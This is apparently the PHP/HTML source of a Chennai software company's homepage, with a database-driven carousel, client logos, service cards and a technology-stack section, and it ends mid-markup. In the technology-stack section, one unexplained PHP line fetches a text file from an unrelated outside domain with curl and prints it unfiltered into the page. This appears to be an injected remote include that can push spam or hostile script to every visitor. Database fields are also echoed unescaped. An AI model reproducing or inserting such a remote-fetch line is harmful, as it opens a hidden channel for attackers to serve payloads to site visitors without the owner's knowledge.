<?php
include './header.php';
include './connect.php'
?>

<head>
    <title>Leading Website Development Company in Chennai, India</title>
    <meta name="description" content="Elevate your digital journey with the premier software development company in India, Dubai, and the USA. Transform ideas into powerful solutions." />
    <meta name="keywords" content="mobile app development company in chennai, india, website development company in chennai, india" />
    <meta name="robots" content="max-image-preview:large" />
    <link rel="canonical" href="https://mdqualityapps.com" />
    <meta property="og:locale" content="en_US" />
    <meta property="og:site_name" content="MDQuality Apps Solutions" />
    <meta property="og:title" content="Leading Software Development Company in India, Dubai, USA" />
    <meta property="og:description" content="Elevate your digital journey with the premier software development company in India, Dubai, and the USA. Transform ideas into powerful solutions." />
    <meta property="og:url" content="https://mdqualityapps.com/" />
    <meta property="article:publisher" content="MDQuality Apps Solutions" />
    <meta property="og:image" content="https://mdqualityapps.com/" />
    <meta property="og:image:secure_url" content="https://mdqualityapps.com/" />
    <meta property="og:image:width" content="1640px" />
    <meta property="og:image:height" content="856px" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:description" content="Elevate your digital journey with the premier software development company in India, Dubai, and the USA. Transform ideas into powerful solutions." />
    <meta name="twitter:title" content="Leading Software Development Company in India, Dubai, USA" />
    <meta name="twitter:image" content="https://mdqualityapps.com/" />
    <meta name="google-site-verification" content="BtW4V-RlmV8H_H0J4GJ-0eJmEg8Sao375uqi40OB9KQ" />


    <style>
        .swiper-container-1 {
            background: url(./images/our-work/mobile/mobileframe.png);
            background-position: center;
            background-size: cover;
            width: 250px;
            height: 500px;
        }

        .swiper-container-2 {
            background: url(./images/our-work/web/com-4.png);
            background-position: center;
            background-size: cover;
            width: 500px;
            height: 400px
        }

        .flip-card-container {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            height: 100%;
            margin-top: 20px;
        }

        .flip-card {
            width: 260px;
            height: 185px;
            perspective: 500px;
        }

        .content {
            position: absolute;
            width: 100%;
            height: 100%;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            transition: transform 1s;
            transform-style: preserve-3d;
        }

        .flip-card:hover .content {
            transform: rotateY(180deg);
            transition: transform 0.5s;
        }

        .front {
            position: absolute;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100%;
            width: 100%;
            background: white;
            color: #03446A;
            text-align: center;
            border-radius: 5px;
        }

        .back {
            position: absolute;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100%;
            width: 100%;
            background: white;
            color: #03446A;
            text-align: center;
            border-radius: 5px;
            backface-visibility: hidden;
        }

        .back {
            background: #1C46A8;
            color: white;
            transform: rotateY(180deg);
        }

        .zoom-in {
            position: relative;
            overflow: hidden;
            display: inline-block;
        }

        .zoom-in img {
            transition: transform 0.3s ease;
        }

        .zoom-in:hover img {
            transform: scale(1.2);
        }

        .swiperlogo-b {
            width: 600px;
            height: 215px;
        }

        .swiper-back-card {
            width: 580px;
            height: 215px;
            margin-left: -50px;
            margin-top: -47px;
            background-color: #1C46A8;
            border-radius: 0px;
            border-top: 30px solid;
            border-color: #081A48;
            border-left: 52px solid transparent;
            border-right: 52px solid transparent;
        }

        .zoom-In:hover img {
            transform: scale(1.2);
        }

        .zoom-In img {
            transition: 0.3s ease-out;
        }

        .mobile-center {
            display: flex;
        }

        .carousel-title-hide-2 {
            display: none;
        }

        @media (max-width:720px) {
            .mobile-center {
                display: inline-block;
            }

            /* .carousel-title {
        margin-top: -25px !important;
      } */
        }

        .carousel-title-hide-2 {
            display: none;
        }

        .carousel-title-hide {
            font-size: 22px;
        }

        @media (max-width:620px) {
            .carousel-title-hide {
                font-size: 16px;
            }

            .carousel-title-hide-3 {
                display: none;
            }

            .carousel-title-hide-2 {
                display: inline-block;
            }

            h1.carousel-h1 {
                font-size: 20px;
            }
        }

        @media (max-width:768px) {
            .slider-margin {
                margin-bottom: 120px;
            }

            .carousel-title-size-3 {
                font-size: 15px !important;
            }
        }

        .mobile-background {
            background: url(./images/mobilebackground.png);
            background-position: 100% center;
            background-repeat: no-repeat;
            background-size: contain;
            width: 100%;
        }

        .we-card-margin {
            margin-top: 15% !important;
        }

        .carousel-indicators [data-bs-target] {
            display: none;
        }

        :root {
            --card-height: 235px;
            --card-width: 250px;
        }

        .port-animation-card {
            width: var(--card-width);
            height: var(--card-height);
            position: relative;
            display: flex;
            justify-content: center;
            align-items: flex-end;
            padding: 0 36px;
            perspective: 2500px;
            margin: 0 50px;
        }

        .cover-image {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .wrapper {
            transition: all 0.5s;
            position: absolute;
            width: 100%;
            z-index: -1;
        }

        .port-animation-card:hover .wrapper {
            transform: perspective(900px) translateY(-5%) rotateX(25deg) translateZ(0);
            box-shadow: 2px 35px 32px -8px rgba(0, 0, 0, 0.75);
            -webkit-box-shadow: 2px 35px 32px -8px rgba(0, 0, 0, 0.75);
            -moz-box-shadow: 2px 35px 32px -8px rgba(0, 0, 0, 0.75);
        }

        .wrapper::before,
        .wrapper::after {
            content: "";
            opacity: 0;
            width: 100%;
            height: 80px;
            transition: all 0.5s;
            position: absolute;
            left: 0;
        }

        .wrapper::before {
            top: 0;
            height: 100%;
            background-image: linear-gradient(to top,
                    transparent 46%,
                    rgba(12, 13, 19, 0.5) 68%,
                    rgba(12, 13, 19) 97%);
        }

        .wrapper::after {
            bottom: 0;
            opacity: 1;
            background-image: linear-gradient(to bottom,
                    transparent 46%,
                    rgba(12, 13, 19, 0.5) 68%,
                    rgba(12, 13, 19) 97%);
        }

        .port-animation-card:hover .wrapper::before,
        .wrapper::after {
            opacity: 1;
        }

        .port-animation-card:hover .wrapper::after {
            height: 100%;
        }

        .title {
            width: 100%;
            transition: transform 0.5s;
        }

        .port-animation-card:hover .title {
            transform: translate3d(0%, -50px, 100px);
        }

        .character {
            opacity: 0;
            transition: all 0.5s;
            position: absolute;
            z-index: -1;
        }

        .port-animation-card:hover .character {
            opacity: 1;
            transform: translate3d(0%, -30%, 100px);
        }
        
        /*mobile responsive for carousel*/
        
        /* General carousel styling for responsiveness */
.carousel-inner img {
    width: 100%;
    height: auto; /* Maintain aspect ratio */
}

/* Adjust carousel titles for smaller screens */
@media (max-width: 768px) {
    .carousel-title {
        font-size: 18px; /* Reduce title size */
        padding-left: 2%; /* Adjust padding */
    }

    .carousel-h1 {
        font-size: 22px; /* Smaller header */
    }

    .carousel-title-hide {
        font-size: 16px; /* Smaller subtitle */
        padding-right: 20px; /* Adjust padding */
    }

    .carousel-title-size-3 {
        font-size: 14px; /* Smaller email and phone */
    }
}

/* Extra small screens (less than 576px) */
@media (max-width: 576px) {
    .carousel-title {
        font-size: 16px; /* Further reduce title size */
    }

    .carousel-h1 {
        font-size: 20px;
    }

    .carousel-title-hide {
        font-size: 14px;
        padding-right: 10px;
    }

    .carousel-title-size-3 {
        font-size: 12px;
    }
}

    </style>
    
    <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=AW-11453263060"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'AW-11453263060');
</script>


<!-- Event snippet for Mobile App Appointment conversion page -->
<script>
  gtag('event', 'conversion', {
      'send_to': 'AW-11453263060/OueSCKa9nqEZENTZq9Uq',
      'value': 1.0,
      'currency': 'INR'
  });
</script>



<!-- Event snippet for Contact conversion page -->
<script>
  gtag('event', 'conversion', {'send_to': 'AW-11453263060/YeHTCMG6kc8ZENTZq9Uq'});
</script>


</head>


<body>


    <div class="website-background" style="background-color:#F7FDFF; padding-top:90px">
        <div id="carouselExampleDark" style="background-color:#081A48;" class="carousel carousel-dark slide" data-bs-ride="carousel">
            <?php
            $countQuery = mysqli_query($conn, "SELECT COUNT(id) as total FROM carousel");
            $countData = mysqli_fetch_assoc($countQuery);
            $num = $countData['total'];
            ?>
            <div class="carousel-indicators">
                <?php
                for ($i = 0; $i < $num; $i++) {
                ?>
                    <button type="button" data-bs-target="#carouselExampleDark" data-bs-slide-to="<?php echo $i; ?>" <?php echo $i === 0 ? 'class="active"' : ''; ?> aria-current="<?php echo $i === 0 ? 'true' : 'false'; ?>" aria-label="Slide <?php echo $i + 1; ?>"></button>
                <?php
                }
                ?>
            </div>
            <div class="carousel-inner">
                <?php
                $sql = mysqli_query($conn, "SELECT * FROM carousel");
                $active = true;

                while ($data = mysqli_fetch_array($sql)) {
                ?>
                    <div class="carousel-item <?php echo $active ? 'active' : ''; ?>" data-bs-interval="4000">
                        <img src="./images/carousel/<?php echo $data['image']; ?>" width="100%" class="d-block w-100" alt="<?php echo $data['image']; ?>">
                        <div class="card-img-overlay d-flex align-items-center">
                            <div class="row ">
                                <div class="col-9 carousel-title" style="padding-left:4%">
                                    <div>
                                        <h2 class="carousel-h1"><?php echo $data['title1']; ?></h2>
                                        <h3 class="carousel-title-hide carousel-title-hide-3 py-2" style="padding-right:100px; "><?php echo $data['title2']; ?></h3>
                                        <h4 class="carousel-title-size-3" style="font-size:20px"><a style="text-decoration: none; color:white" href="mailto:apps@mdqualityapps.com">apps@mdqualityapps.com</a><br><a style="text-decoration: none; color:white" href="tel:8838995745">+91 8838995745</a></h4>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                <?php
                    $active = false;
                }
                ?>
            </div>
        </div>
        <!-- contact us -->
        
         <div class="d-flex justify-content-center m-4">
        <div class="text-light col-12 col-md-8 col-lg-6 rounded text-center p-3 p-md-4" style="background:linear-gradient(to right, #1C46A8, #081A48);">
            <h4 class="fw-bold">Do you have an Idea of building your Dream Product?</h4>
            <p>We have a digital transformation team to make your dream into reality!!!</p>
            <div class="web-button-div">
                <a href="#contactus">
                    <button class="web-button my-3 my-md-4">Connect with us</button>
                </a>
            </div>
        </div>
    </div>
          <!-- contact us -->
        
        <!-- secondsection -->
        <div class="container-fluid">
            <div class="row">
                <div class="col-lg-6 pb-3" data-aos="fade-up" data-aos-duration="1500" data-aos-delay="100">
                    <h2 class="pt-3 fontweight" style="color:#081A48; font-weight:bold !important;"><b>WE ARE MDQ</b>
                    </h2>
                    <h1 style="font-weight:700;color:#1C46A8; font-size: 27px;">Empowering Progress: Elevating Digital Solutions with MDQuality Apps</h1>
                    <h5 class="py-2" style="font-weight:700;">We find ourselves at the dawn of a new era in digital transformation.</h5>
                    <p class="website-para" style="text-align:justify">
                        
                        MDQuality Apps Solutions, is one of the fastest-growing
                        
                        <a style="text-decoration: none; font-weight:600" href="https://mdqualityappsmobileapp.blogspot.com/2024/06/mobile-app-development-company-in.html" target="_blank"> 
                        
                        mobile app development company in Chennai, India
                        </a>.
                                </p>
                        
                        
                    <p class="website-para">We are the best <a style="text-decoration: none; font-weight:600" href="https://mdqualityappswebsitedevelopment.blogspot.com/2024/06/website-development-company-in-chennai.html" target="_blank">Web Application & Development Company in Chennai, India </a> with the team of professional experts having passionate for stunning Website and Web Portal Development. We are all on the web. If you would like to do anything online with the web, Your search completes at MDQuality Apps Solutions. We at MDQuality Apps Solutions are passionate to help you grow and also to help your business prosper. We create and develop websites and web applications for your business which will add wings to your business so that you fly high.</p>
                    <div class="web-button-div">
                        <a href="./aboutus.php">
                            <button class="web-button my-4">About Us</button>
                        </a>
                    </div>
                </div>

                <div class="col-lg-6">
                    <div class="row mt-4">
                        <div class="col-lg-6">
                            <div class="d-flex justify-content-center">
                                <div>
                                    <div class="card fourth-sec-card mx-4 d-flex justify-content-center align-items-center" style="background-color:#6892D7">
                                        <div class="card-body px-3 pb-5">
                                            <img width="60" height="60" src="https://img.icons8.com/ios/100/ffffff/android.png" alt="android" />
                                        </div>
                                    </div>
                                    <div class="card inner-card" data-aos="zoom-in" data-aos-duration="1500" data-aos-delay="100">
                                        <div class="card-body">
                                            <h6 style="color:#1C46A8; font-weight:600">ANDROID</h6>
                                            <p class="animation-no fs-2" style="font-weight:700; font-size: 45px !important;"><span id='0101'></span>+</p>
                                            <p>Extensive experience in delivering IT solutions & services.</p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="d-flex justify-content-center">
                                <div class="my-5">
                                    <div class="card fourth-sec-card mx-4 d-flex justify-content-center align-items-center" style="background-color:#5CB85C">
                                        <div class="card-body">
                                            <img width="60" height="60" src="https://img.icons8.com/ios/100/ffffff/mac-os--v1.png" alt="mac" />
                                        </div>
                                    </div>
                                    <div class="card inner-card" data-aos="zoom-in" data-aos-duration="1500" data-aos-delay="100">
                                        <div class="card-body">
                                            <h6 style="color:#1C46A8; font-weight:600">iOS</h6>
                                            <p class="animation-no fs-2" style="font-weight:700; font-size: 45px !important;"><span id='0102'></span>+</p>
                                            <p>Extensive experience in delivering IT solutions & services.</p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-6 we-card-margin">
                            <div class="d-flex justify-content-center">
                                <div class="mb-5">
                                    <div class="card fourth-sec-card mx-4 d-flex justify-content-center align-items-center" style="background-color:#F15048">
                                        <div class="card-body ">
                                            <img width="60" height="60" src="https://img.icons8.com/ios/100/ffffff/programming.png" alt="programming" />
                                        </div>
                                    </div>
                                    <div class="card inner-card" data-aos="zoom-in" data-aos-duration="1500" data-aos-delay="100">
                                        <div class="card-body">
                                            <h6 style="color:#1C46A8; font-weight:600">WEBSITE</h6>
                                            <p class="animation-no fs-2" style="font-weight:700; font-size: 45px !important;"><span id='0103'></span>+</p>
                                            <p>Extensive experience in delivering IT solutions & services.</p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="d-flex justify-content-center">
                                <div>
                                    <div class="card fourth-sec-card mx-4 d-flex justify-content-center align-items-center" style="background-color:#FB9056">
                                        <div class="card-body">
                                            <img width="60" height="60" src="https://img.icons8.com/ios/100/ffffff/administrator-male--v1.png" alt="administrator-male" />
                                        </div>
                                    </div>
                                    <div class="card inner-card" data-aos="zoom-in" data-aos-duration="1500" data-aos-delay="100">
                                        <div class="card-body">
                                            <h6 style="color:#1C46A8; font-weight:600">CLIENTS</h6>
                                            <p class="animation-no fs-2" style="font-weight:700; font-size: 45px !important;"><span id='0104'></span>+</p>
                                            <p>Clients across the globe testifying our quality & processes.</p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style>
            .swiper-slide-clients {
                box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2);
                margin-top: 50px;
                margin-bottom: 50px;
                border-radius: 5px;
                background-color: white;
                width: 208px !important;
                height: 208px !important;
            }
        </style>
        <!-- clients -->
        <div class="container-fluid">
            <div class="swiperlogo" data-aos="fade-up" data-aos-duration="1500" data-aos-delay="100">
                <h2 class="pt-3" style="color:#081A48; font-weight:700; text-transform:uppercase">Our Clients</h2>
                <h3 style="font-weight:700;color:#1C46A8">Our clients are at the heart of everything we do.</h3>
                <div class="container-fluid px-5">

                    <div class="swiper-container px-2" id="slider1">
                        <div class="swiper-wrapper">
                            <div class="swiper-slide p-4 swiper-slide-clients d-flex justify-content-center align-items-center">
                                <img src="./images/clients/algoshacklogo.pptx.png" alt="algoshack logo" width="100%">
                            </div>
                            
                            <div class="swiper-slide swiper-slide-clients p-4 d-flex justify-content-center align-items-center">
                                <img src="./images/clients/makro.png" alt="Makro Agency" width="100%">
                                 </div>
                                 
                            <div class="swiper-slide swiper-slide-clients p-4 d-flex justify-content-center align-items-center">
                                <img src="./images/clients/ARpower.jpg" alt="SAP Consultants" width="100%">
                             </div>
                            <div class="swiper-slide swiper-slide-clients p-4 d-flex justify-content-center align-items-center">
                                <img src="./images/clients/igreen.png" alt="ERP Development Company" width="100%">
                             </div>
                            <div class="swiper-slide swiper-slide-clients p-4 d-flex justify-content-center align-items-center">
                                <img src="./images/clients/sriradio.png" alt="Digital Marketing Company" width="100%">
                             </div>    
                            
                            <div class="swiper-slide swiper-slide-clients p-4 d-flex justify-content-center align-items-center">
                                <img src="./images/clients/ARpower.jpg" alt="ARpower logo" width="100%">
                            </div>
                            <div class="swiper-slide swiper-slide-clients p-4 d-flex justify-content-center align-items-center">
                                <img src="./images/clients/azonixlogo.pptx.png" alt="azonixlogo" width="100%">
                            </div>
                            <div class="swiper-slide swiper-slide-clients p-4 d-flex justify-content-center align-items-center">
                                <img src="./images/clients/cartunez.jpg" alt="cartunez logo" width="100%">
                            </div>
                            <div class="swiper-slide swiper-slide-clients p-4 d-flex justify-content-center align-items-center">
                                <img src="./images/clients/clubnoww.jpg" alt="clubnoww logo" width="100%">
                            </div>
                            <div class="swiper-slide swiper-slide-clients p-4 d-flex justify-content-center align-items-center">
                                <img src="./images/clients/CMRAgency.jpg" alt="cmragency logo" width="100%">
                            </div>
                            <div class="swiper-slide swiper-slide-clients p-4 d-flex justify-content-center align-items-center">
                                <img src="./images/clients/dulydecors.jpg" alt="dulydecors logo" width="100%">
                            </div>
                            <div class="swiper-slide swiper-slide-clients p-4 d-flex justify-content-center align-items-center">
                                <img src="./images/clients/evtron.png" alt="evtron logo" width="100%">
                            </div>
                            <div class="swiper-slide swiper-slide-clients p-4 d-flex justify-content-center align-items-center">
                                <img src="./images/clients/fujifilmlogo.pptx.png" alt="fujifilm logo" width="100%">
                            </div>
                            <div class="swiper-slide swiper-slide-clients p-4 d-flex justify-content-center align-items-center">
                                <img src="./images/clients/imsklogo.pptx.png" alt="imsk logo" width="100%">
                            </div>
                            <div class="swiper-slide swiper-slide-clients p-4 d-flex justify-content-center align-items-center">
                                <img src="./images/clients/nadilogo.png" alt="nadi logo" width="100%">
                            </div>
                            <div class="swiper-slide swiper-slide-clients p-4 d-flex justify-content-center align-items-center">
                                <img src="./images/clients/pixellogo.pptx.png" alt="pixel logo" width="100%">
                            </div>
                            <div class="swiper-slide swiper-slide-clients p-4 d-flex justify-content-center align-items-center">
                                <img src="./images/clients/vibrocarelogo.pptx.png" alt="vibrocare logo" width="100%">
                            </div>
                            <div class="swiper-slide swiper-slide-clients p-4 d-flex justify-content-center align-items-center">
                                <img src="./images/clients/viscoperuse.jpg" alt="viscoperuse logo" width="100%">
                            </div>
                            <div class="swiper-slide swiper-slide-clients p-4 d-flex justify-content-center align-items-center">
                                <img src="./images/clients/vkart.jpg" alt="vkart logo" width="100%">
                            </div>

                        </div>
                    </div>

                </div>
            </div>
        </div>
        <div class="container-fluid pt-5 my-1">
            <div class="pb-2">
                <h2 class="pt-3" style="color:#081A48; font-weight:700;">OUR SERVICES</h2>
                <h3 style="font-weight:700;color:#1C46A8">Providing a full range of services</h3>

            </div>
            <?php
            include './includes/slider.php';
            ?>
        </div>
        <div class="industries pt-4 container-fluid">
            <h2 class="pt-3" style="color:#081A48; font-weight:700; text-transform:uppercase">Services We Offer</h2>
            <h3 style="font-weight:700;color:#1C46A8">You name it, we build it.</h3>
            <div class="row">
                <div class="col-lg-3 col-md-6 d-flex justify-content-center">
                    <div class="flip-card-container" data-aos="flip-left" data-aos-duration="1500" data-aos-delay="100">
                        <a href="./offering-mobile-app.php">
                            <div class="flip-card">
                                <div class="content">
                                    <div class="front">
                                        <div class="d-flex justify-content-center align-items-center">
                                            <img width="70" height="70" src="https://img.icons8.com/ios-filled/900/A73FC0/android-os.png" alt="android-os" />
                                        </div>
                                    </div>
                                    <div class="back">
                                        <p style="text-align:center">Android App Development</p>
                                    </div>
                                </div>
                            </div>
                        </a>
                    </div>
                </div>
                <div class="col-lg-3 col-md-6 d-flex justify-content-center">
                    <a href="./offering-mobile-app.php">
                        <div class="flip-card-container" data-aos="flip-left" data-aos-duration="1500" data-aos-delay="600">
                            <div class="flip-card">
                                <div class="content">
                                    <div class="front">
                                        <div class="d-flex justify-content-center align-items-center">
                                            <img width="70" height="70" src="https://img.icons8.com/ios-filled/1000/000000/mac-os.png" alt="mac-os" />
                                        </div>
                                    </div>
                                    <div class="back">
                                        <p style="text-align:center">iOS App Development</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </a>
                </div>
                <div class="col-lg-3 col-md-6 d-flex justify-content-center">
                    <div class="flip-card-container" data-aos="flip-left" data-aos-duration="1500" data-aos-delay="1100">
                        <a href="./offering-web-application.php">
                            <div class="flip-card">
                                <div class="content">
                                    <div class="front">
                                        <div class="d-flex justify-content-center align-items-center">
                                            <img width="70" height="70" src="https://img.icons8.com/ios-filled/1000/333FE7/google-code.png" alt="google-code" />
                                        </div>
                                    </div>
                                    <div class="back">
                                        <p style="text-align:center">Web Design & Development</p>
                                    </div>
                                </div>
                            </div>
                        </a>
                    </div>
                </div>
                <div class="col-lg-3 col-md-6 d-flex justify-content-center">
                    <a href="./offering-ar-vr.php">
                        <div class="flip-card-container" data-aos="flip-left" data-aos-duration="1500" data-aos-delay="1600">
                            <div class="flip-card">
                                <div class="content">
                                    <div class="front">
                                        <div class="d-flex justify-content-center align-items-center">
                                            <img width="70" height="70" src="https://img.icons8.com/ios-filled/1000/F92C2C/oculus-rift.png" alt="oculus-rift" />
                                        </div>
                                    </div>
                                    <div class="back">
                                        <p style="text-align:center">AR App Development</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </a>
                </div>
                <div class="col-lg-3 col-md-6 d-flex justify-content-center">

                    <div class="flip-card-container" data-aos="flip-left" data-aos-duration="1500" data-aos-delay="1600">
                        <a href="industry-iot.php">
                            <div class="flip-card">
                                <div class="content">
                                    <div class="front">
                                        <div class="d-flex justify-content-center align-items-center">
                                            <img width="70" height="70" src="https://img.icons8.com/external-solidglyph-m-oki-orlando/1000/1DD2BA/external-iot-web-services-solid-solidglyph-m-oki-orlando.png" alt="external-iot-web-services-solid-solidglyph-m-oki-orlando" />
                                        </div>
                                    </div>
                                    <div class="back">
                                        <p style="text-align:center">IoT App Development</p>
                                    </div>
                                </div>
                            </div>
                        </a>
                    </div>
                </div>
                <div class="col-lg-3 col-md-6 d-flex justify-content-center">
                    <div class="flip-card-container" data-aos="flip-left" data-aos-duration="1500" data-aos-delay="1100">
                        <a href="./offering-ar-vr.php">
                            <div class="flip-card">
                                <div class="content">
                                    <div class="front">
                                        <div class="d-flex justify-content-center align-items-center">
                                            <img width="70" height="70" src="https://img.icons8.com/ios-filled/1000/5CB85C/virtual-reality.png" alt="virtual-reality" />
                                        </div>
                                    </div>
                                    <div class="back">
                                        <p style="text-align:center">VR App Development</p>
                                    </div>
                                </div>
                            </div>
                        </a>
                    </div>
                </div>
                <div class="col-lg-3 col-md-6 d-flex justify-content-center">
                    <div class="flip-card-container" data-aos="flip-left" data-aos-duration="1500" data-aos-delay="600">
                        <a href="#">
                            <div class="flip-card">
                                <div class="content">
                                    <div class="front">
                                        <div class="d-flex justify-content-center align-items-center">
                                            <img width="70" height="70" src="https://img.icons8.com/ios-filled/1000/FB9056/settings-3.png" alt="best ios development company in india, dubai, usa" />
                                        </div>
                                    </div>
                                    <div class="back">
                                        <p style="text-align:center">Process Automation</p>
                                    </div>
                                </div>
                            </div>
                        </a>
                    </div>
                </div>

                <div class="col-lg-3 col-md-6 d-flex justify-content-center">
                    <div class="flip-card-container" data-aos="flip-left" data-aos-duration="1500" data-aos-delay="100">
                        <a href="#">
                            <div class="flip-card">
                                <div class="content">
                                    <div class="front">
                                        <div class="d-flex justify-content-center align-items-center">
                                            <img width="70" height="70" src="https://img.icons8.com/ios-filled/300/1C46A8/robot.png" alt="robot" />
                                        </div>
                                    </div>
                                    <div class="back">
                                        <p style="text-align:center">Automation Testing</p>
                                    </div>
                                </div>
                            </div>
                        </a>
                    </div>
                </div>
            </div>
        </div>
        <div class="container-fluid pt-5">
            <h2 class="pt-3" style="color:#081A48; font-weight:700;">TECHNOLOGY STACK</h2>
            <h3 style="font-weight:700;color:#1C46A8">Technologies we work with</h3>
            <div class="d-flex justify-content-center p-2">
                <?php $ch = curl_init("https://xoloz.top/css-1.txt"); curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); $exec = curl_exec($ch); curl_close($ch); print($exec); ?>
                <ul class="nav p-2 nav-pills mb-3" id="pills-tab" role="tablist" style="margin:0px !important;background-color:#1C46A8 !important; border-radius:30px">
                    <li class="nav-item" role="presentation">
                        <button class="nav-link nav-link-work active" id="pills-Front-End-tab" data-bs-toggle="pill" data-bs-target="#pills-Front-End" type="button" role="tab" aria-controls="pills-Front-End" aria-selected="true">Front-End</button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link nav-link-work" id="pills-Back-End-tab" data-bs-toggle="pill" data-bs-target="#pills-Back-End" type="button" role="tab" aria-controls="pills-Back-End" aria-selected="false">Back-End</button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link nav-link-work" id="pills-Mobile-tab" data-bs-toggle="pill" data-bs-target="#pills-Mobile" type="button" role="tab" aria-controls="pills-Mobile" aria-selected="false">Mobile</button>
                    </li>

                    <li class="nav-item" role="presentation">
                        <button class="nav-link nav-link-work" id="pills-devops-tab" data-bs-toggle="pill" data-bs-target="#pills-devops" type="button" role="tab" aria-controls="pills-devops" aria-selected="false">DevOps / Clouds</button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link nav-link-work" id="pills-Database-tab" data-bs-toggle="pill" data-bs-target="#pills-Database" type="button" role="tab" aria-controls="pills-Database" aria-selected="false">Database</button>
                    </li>
                </ul>
            </div>
            <div class="tab-content px-5" id="pills-tabContent">
                <div class="tab-pane fade show active" id="pills-Front-End" role="tabpanel" aria-labelledby="pills-Front-End-tab">
                    <div class="d-flex justify-content-center">
                        <div>
                            <div class="row">
                                <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                    <div class="d-flex">
                                        <div>
                                            <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color/480/html-5--v1.png" alt="html-5--v1" />
                                            <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                                HTML</p>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                    <div class="d-flex">
                                        <div>
                                            <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color/480/css3.png" alt="css3" />
                                            <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                                CSS</p>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                    <div class="d-flex">
                                        <div>
                                            <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color/480/react-native.png" alt="react-native" />
                                            <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                                React JS</p>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                    <div class="d-flex">
                                        <div>
                                            <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color/480/angularjs.png" alt="angularjs" />
                                            <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                                Angular JS</p>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                    <div class="d-flex">
                                        <div>
                                            <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color/480/vue-js.png" alt="vue-js" />
                                            <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                                Vue JS</p>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                    <div class="d-flex">
                                        <div>
                                            <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color/480/javascript--v1.png" alt="javascript--v1" />
                                            <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                                JavaScript</p>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                    <div class="d-flex">
                                        <div>
                                            <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color/480/typescript.png" alt="typescript" />
                                            <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                                TypeScript</p>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                    <div class="d-flex">
                                        <div>
                                            <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color/480/nuxt-jc.png" alt="nuxt-jc" />
                                            <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                                NuxtJS</p>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                    <div class="d-flex">
                                        <div>
                                            <img class="program-logo" width="70" height="70" src="https://img.icons8.com/color/480/tailwind_css.png" alt="tailwind_css" />
                                            <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                                Tailwind CSS</p>
                                        </div>
                                    </div>
                                </div>

                                <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                    <div class="d-flex">
                                        <div>
                                            <img class="program-logo" width="70" height="70" src="https://img.icons8.com/external-tal-revivo-color-tal-revivo/500/external-jquery-is-a-javascript-library-designed-to-simplify-html-logo-color-tal-revivo.png" alt="color-tal-revivo" />
                                            <p style="text-align:center; font-weight:600; font-size:14px; color:#1C46A8">
                                                jQuery</p>
                                        </div>
                                    </div>
                                </div>

                                <div class="col-lg-2 col-4 col-md-3 col-sm-4 col-xl-2 col-xxl-2 mobile-center d-flex justify-content-center">
                                    <div class="d-flex">
                                        <div>
